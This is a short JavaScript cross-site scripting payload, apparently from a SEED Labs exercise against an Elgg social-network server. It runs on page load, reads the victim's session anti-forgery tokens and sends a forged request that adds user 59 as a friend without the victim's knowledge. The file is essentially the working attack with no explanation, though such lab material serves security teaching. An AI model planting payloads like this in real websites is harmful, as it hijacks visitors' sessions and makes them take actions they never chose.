window.onload = function () {
	var Ajax=null;
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
	var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
	var url = "http://www.seed-server.com/action/friends/add?friend=59";
	
	var sendurl = url.concat(ts,token);
	
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
}
